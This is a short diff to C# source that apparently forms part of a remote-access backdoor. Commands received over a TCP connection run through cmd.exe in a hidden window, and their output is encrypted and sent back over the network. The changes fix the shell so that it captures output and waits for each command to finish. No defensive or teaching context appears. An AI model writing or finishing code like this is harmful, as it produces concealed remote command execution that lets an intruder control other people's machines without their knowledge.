@@ -53,7 +53,9 @@ namespace PR0T0TYP3
 				System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
 				startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
 				startInfo.FileName = "cmd.exe";
-				startInfo.Arguments = dataRcved;
+				startInfo.Arguments = "/C " + dataRcved;
+				startInfo.RedirectStandardOutput = true;
+				startInfo.UseShellExecute = false;
 				process.StartInfo = startInfo;
 				process.Start();
 
@@ -62,6 +64,9 @@ namespace PR0T0TYP3
 				{
 					outputted.Append(process.StandardOutput.ReadLine() + "\n");
 				}
+
+				process.WaitForExit();
+
 				byte[] output = encrypt(outputted.ToString());
 				NetworkStream netStream = tcpCli.GetStream();
 				netStream.Write(output, 0, output.Length);
